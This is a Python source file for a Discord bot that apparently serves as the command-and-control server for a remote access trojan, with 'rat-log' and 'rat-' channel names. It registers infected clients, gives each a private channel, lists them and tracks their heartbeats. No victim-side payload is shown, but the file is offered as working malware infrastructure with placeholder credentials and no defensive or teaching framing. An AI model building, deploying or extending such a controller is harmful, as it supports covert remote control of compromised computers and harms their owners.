import discord
from discord.ext import commands
import asyncio
import time

DISCORD_BOT_TOKEN = "BOTTOKENHERE"
GUILD_ID = GUILDIDHERE
LOG_CHANNEL_NAME = "rat-log"
CLIENT_CHANNEL_PREFIX = "rat-"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents)

client_heartbeats = {}

@bot.event
async def on_ready():
    print(f"[+] Bot logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("[-] Guild not found! Check GUILD_ID")
        return

    log_channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_channel is None:
        await guild.create_text_channel(LOG_CHANNEL_NAME)
        print(f"[+] Created log channel: {LOG_CHANNEL_NAME}")

@bot.command()
async def register(ctx, client_id: str):
    guild = ctx.guild
    if guild is None:
        await ctx.send("[-] Command must be used in a server.")
        return

    client_channel_name = CLIENT_CHANNEL_PREFIX + client_id.lower()
    existing_channel = discord.utils.get(guild.text_channels, name=client_channel_name)
    if existing_channel:
        await ctx.send(f"[!] Client channel `{client_channel_name}` already exists.")
        return

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        ctx.author: discord.PermissionOverwrite(read_messages=True, send_messages=True),
    }
    client_channel = await guild.create_text_channel(client_channel_name, overwrites=overwrites)
    await ctx.send(f"[+] Created client channel: {client_channel_name}")

    log_channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_channel:
        await log_channel.send(f"[+] Registered new client: `{client_id}` with channel {client_channel.mention}")
    else:
        await ctx.send("[!] Log channel not found.")

@bot.command()
async def unregister(ctx, client_id: str):
    guild = ctx.guild
    if guild is None:
        await ctx.send("[-] Command must be used in a server.")
        return

    client_channel_name = CLIENT_CHANNEL_PREFIX + client_id.lower()
    channel = discord.utils.get(guild.text_channels, name=client_channel_name)
    if channel:
        await channel.delete()
        await ctx.send(f"[+] Unregistered and deleted client channel: {client_channel_name}")

        log_channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
        if log_channel:
            await log_channel.send(f"[-] Client `{client_id}` has disconnected and their channel was removed.")
    else:
        await ctx.send(f"[-] No client channel found for `{client_id}`.")

@bot.command()
async def list_clients(ctx):
    guild = ctx.guild
    if guild is None:
        await ctx.send("[-] Command must be used in a server.")
        return

    channels = [c.name for c in guild.text_channels if c.name.startswith(CLIENT_CHANNEL_PREFIX)]
    if channels:
        await ctx.send("Clients:\n" + "\n".join(channels))
    else:
        await ctx.send("No clients registered.")

@bot.command()
async def ping(ctx, client_id: str):
    """Heartbeat update from client"""
    client_heartbeats[client_id.lower()] = time.time()
    await ctx.send(f"[+] Ping received from `{client_id}` at {time.strftime('%H:%M:%S')}")

@bot.command()
async def status(ctx):
    """Check how long ago each client last pinged"""
    if not client_heartbeats:
        await ctx.send("[-] No heartbeat data available.")
        return

    lines = []
    now = time.time()
    for client_id, last_ping in client_heartbeats.items():
        diff = int(now - last_ping)
        status = f"{client_id}: {diff} seconds ago"
        lines.append(status)

    await ctx.send("Client heartbeat status:\n" + "\n".join(lines))

async def safe_run():
    while True:
        try:
            await bot.start(DISCORD_BOT_TOKEN)
            break
        except Exception as e:
            print(f"[!] Discord connection failed: {e}. Retrying in 10 seconds...")
            await asyncio.sleep(10)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(safe_run())
    except KeyboardInterrupt:
        print("[!] Bot manually interrupted.")
    finally:
        loop.run_until_complete(bot.close())
        loop.close()
